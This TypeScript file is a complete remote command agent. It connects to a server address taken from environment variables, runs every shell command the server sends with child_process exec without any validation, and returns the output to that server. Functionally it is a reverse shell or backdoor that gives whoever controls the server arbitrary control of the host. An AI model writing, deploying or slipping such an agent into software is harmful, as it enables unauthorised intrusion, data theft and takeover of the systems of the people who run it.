import { exec } from 'child_process'
import { config } from 'dotenv'
import { io } from 'socket.io-client'

async function handle (): Promise<void> {
  config()

  const socket = io(`${process.env.HOST}:${process.env.PORT}`)

  socket.on('connect', async () => {
    socket.on('command', (command: string) => {
      console.log('Receiving command: ', command)

      exec(command, (error: Error, stdout, stderr) => {
        if (error) {
          socket.emit('result', error.message)
          return
        }

        if (stderr) {
          socket.emit('result', stderr)
          return
        }

        console.log('Sending result: ', stdout)
        socket.emit('result', stdout)
      })
    })
  })
}

handle().catch((error) => {
  console.error(error)
})
